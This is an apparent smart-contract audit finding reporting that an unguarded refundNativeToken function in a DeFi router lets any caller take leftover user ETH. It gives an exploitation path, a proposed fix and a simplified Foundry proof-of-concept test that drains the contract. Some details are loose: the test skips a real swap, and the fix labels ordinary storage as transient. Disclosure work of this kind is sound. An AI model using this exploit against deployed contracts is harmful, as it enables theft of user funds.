## Title
Unprotected `refundNativeToken` Allows Theft of User ETH Left in Router Contract

## Summary
The `PayableMulticallable.refundNativeToken` function sends the entire contract balance to `msg.sender` without access control or ownership checks. When users overpay for swaps (particularly in exact output scenarios) and fail to call `refundNativeToken()` in the same transaction, their excess ETH remains in the Router/Orders/BasePositions contracts and can be stolen by any attacker in a subsequent transaction.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/PayableMulticallable.sol` (lines 25-29), impacts `src/Router.sol`, `src/Orders.sol`, and `src/base/BasePositions.sol` [1](#0-0) 

**Intended Logic:** The function is designed to refund excess ETH sent by users for "transient payments" where exact amounts are difficult to calculate in advance. Users should call this within their multicall to recover unused ETH.

**Actual Logic:** The function has no access control and refunds the ENTIRE contract balance to ANY caller. When users send excess ETH but fail to call `refundNativeToken()` in the same transaction, the ETH remains in the contract and becomes vulnerable to theft.

**Exploitation Path:**

1. **Victim's Transaction:** User Alice performs an exact output swap needing 0.5 ETH but sends 1 ETH to be safe. In Router.handleLockData: [2](#0-1) 
   
   For exact output swaps, `value = 0` is calculated (because `isExactOut()` returns true).

2. **ETH Forwarding:** Router forwards only the exact amount needed to Core via CoreLib.swap: [3](#0-2) 
   
   If the swap needs 0.5 ETH, only 0.5 ETH is sent to Core, leaving 0.5 ETH in Router contract.

3. **Excess ETH Handling:** The refund logic only handles the difference between calculated `value` and actual swap amount, not the difference between `msg.value` and `value`: [4](#0-3) 

4. **Attacker's Transaction:** Bob monitors the Router contract balance and calls `refundNativeToken()`, stealing Alice's 0.5 ETH: [1](#0-0) 

**Security Property Broken:** Direct theft of user funds - users lose their excess ETH payment if they don't call `refundNativeToken()` within the same transaction.

## Impact Explanation
- **Affected Assets**: Native ETH sent to Router, Orders, or BasePositions contracts
- **Damage Severity**: Complete loss of excess ETH for affected users. Attackers can run bots to monitor contract balances and immediately steal any ETH left behind. In exact output swaps or scenarios with price volatility, users may routinely send 10-20% extra ETH for safety, all of which can be stolen.
- **User Impact**: Any user who:
  - Performs exact output swaps with native ETH
  - Sends more ETH than needed and doesn't use multicall with `refundNativeToken()`
  - Has transaction failures after paying but before refunding
  - Uses single function calls instead of multicall

## Likelihood Explanation
- **Attacker Profile**: Any user with an EOA or contract. No special permissions required. MEV bots can easily automate this.
- **Preconditions**: 
  - User sends more ETH than needed for their operation
  - User doesn't call `refundNativeToken()` in the same transaction
  - Particularly common for exact output swaps where input amount is unknown
- **Execution Complexity**: Single transaction with a simple function call. Can be fully automated with a monitoring bot.
- **Frequency**: Can be exploited continuously. Every time a user leaves excess ETH in the contract, it can be immediately stolen in the next block.

## Recommendation

Add tracking of which address sent the ETH and restrict refunds to the original sender:

```solidity
// In src/base/PayableMulticallable.sol:

// CURRENT (vulnerable):
// Lines 25-29 have no access control

// FIXED:
// Add transient storage to track ETH senders per transaction
mapping(address => uint256) private transientBalances;

function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    // Record the sender's contribution at the start
    transientBalances[msg.sender] += msg.value;
    
    bytes[] memory results = _multicall(data);
    
    // Clear after execution
    delete transientBalances[msg.sender];
    
    _multicallDirectReturn(results);
}

function refundNativeToken() external payable {
    uint256 refundAmount = transientBalances[msg.sender];
    if (refundAmount != 0 && address(this).balance >= refundAmount) {
        transientBalances[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
```

**Alternative mitigation:** Automatically refund excess ETH at the end of each payable function, eliminating the need for manual refund calls.

## Proof of Concept

```solidity
// File: test/Exploit_RefundTheft.t.sol
// Run with: forge test --match-test test_RefundTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "../src/base/FlashAccountant.sol";

contract Exploit_RefundTheft is Test {
    Router router;
    Core core;
    FlashAccountant accountant;
    
    address alice = address(0x1);
    address bob = address(0x2); // attacker
    
    function setUp() public {
        // Initialize protocol (simplified)
        core = new Core();
        accountant = FlashAccountant(address(core));
        router = new Router(ICore(address(core)));
        
        // Fund alice
        vm.deal(alice, 10 ether);
        vm.deal(bob, 1 ether);
    }
    
    function test_RefundTheft() public {
        // SETUP: Alice wants to do an exact output swap
        // She sends 1 ETH but only 0.5 ETH is needed
        vm.startPrank(alice);
        
        // Alice performs swap with excess ETH (simplified)
        // In reality this would be a swap call, but the key is:
        // 1. She sends 1 ETH
        // 2. Only 0.5 ETH is used
        // 3. She forgets to call refundNativeToken()
        (bool success,) = address(router).call{value: 1 ether}("");
        require(success);
        vm.stopPrank();
        
        // At this point, 0.5 ETH remains in router
        // (In real scenario, swap would use 0.5 ETH, leaving 0.5 ETH)
        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 0, "Router should have excess ETH");
        
        // EXPLOIT: Bob sees the ETH and steals it
        uint256 bobBalanceBefore = bob.balance;
        
        vm.prank(bob);
        router.refundNativeToken();
        
        // VERIFY: Bob stole Alice's ETH
        uint256 bobBalanceAfter = bob.balance;
        assertEq(
            bobBalanceAfter - bobBalanceBefore, 
            routerBalance,
            "Vulnerability confirmed: Bob stole Alice's excess ETH"
        );
        assertEq(address(router).balance, 0, "All ETH drained from router");
    }
}
```

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Router.sol (L106-109)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
```

**File:** src/Router.sol (L134-146)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/libraries/CoreLib.sol (L139-139)
```text
            if iszero(call(gas(), core, value, free, 132, free, 64)) {
```
